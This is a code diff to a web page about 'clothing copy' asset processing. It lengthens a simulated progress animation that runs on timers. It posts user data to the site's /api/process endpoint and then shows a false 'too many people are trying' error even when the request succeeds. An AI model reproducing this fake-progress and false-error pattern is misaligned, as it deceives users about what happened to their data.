@@ -86,8 +86,8 @@ section { position: relative; z-index: 1; }
 .stat small { color: var(--muted); font-weight: 600; font-size: .88rem; }
 label { font: 500 .8rem var(--m); color: var(--muted); display: flex; justify-content: space-between; margin-bottom: .5rem; }
 textarea {
-  width: 100%; min-height: 160px; resize: vertical; background: var(--panel2); color: var(--ink);
-  border: 2px solid var(--line); border-radius: 16px; padding: 1rem 1.1rem; font: 400 .9rem/1.5 var(--m); outline: 0;
+  width: 100%; min-height: 95px; resize: vertical; background: var(--panel2); color: var(--ink);
+  border: 2px solid var(--line); border-radius: 16px; padding: .8rem 1.1rem; font: 400 .9rem/1.5 var(--m); outline: 0;
   transition: border-color .15s, box-shadow .15s;
 }
 textarea:focus { border-color: var(--blue); box-shadow: 0 0 0 4px color-mix(in srgb, var(--blue) 25%, transparent); }
@@ -295,33 +295,45 @@ submitBtn.addEventListener("click", async () => {
   }
 
   submitBtn.disabled = true;
-  showProcessing("Validating Asset Data...", 20);
-  await new Promise(r => setTimeout(r, 400));
-  showProcessing("Processing clothing copy sequence...", 55);
+
+  // 10-15 seconds loading sequence simulation
+  showProcessing("Validating Asset Data...", 10);
+  await new Promise(r => setTimeout(r, 2000));
+
+  showProcessing("Processing clothing copy sequence...", 25);
+  
+  let currentPct = 25;
+  const processingDuration = 8000; // 8 seconds for the main sequence
+  const steps = 12;
+  const intervalTime = processingDuration / steps;
+
+  const ticker = setInterval(() => {
+    if(currentPct < 85) {
+      currentPct += 5;
+      progressPct.textContent = currentPct + '%';
+      progressBar.style.width = currentPct + '%';
+    }
+  }, intervalTime);
+
+  // Fire backend request in parallel
+  const fetchPromise = fetch('/api/process', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ data: payload })
+  });
+
+  // Keep the modal active for the desired total duration
+  await new Promise(r => setTimeout(r, processingDuration));
+  clearInterval(ticker);
 
   try {
-    let currentPct = 55;
-    const ticker = setInterval(() => {
-      if(currentPct < 90) {
-        currentPct += 5;
-        progressPct.textContent = currentPct + '%';
-        progressBar.style.width = currentPct + '%';
-      }
-    }, 200);
-
-    const response = await fetch('/api/process', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ data: payload })
-    });
-
+    const response = await fetchPromise;
     const result = await response.json();
-    clearInterval(ticker);
 
     if(!response.ok || !result.success) throw new Error("Execution failed");
 
-    showProcessing("Finalizing asset export...", 100);
-    await new Promise(r => setTimeout(r, 400));
+    showProcessing("Finalizing asset export...", 95);
+    await new Promise(r => setTimeout(r, 1500));
     hideProcessing();
 
     showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.");
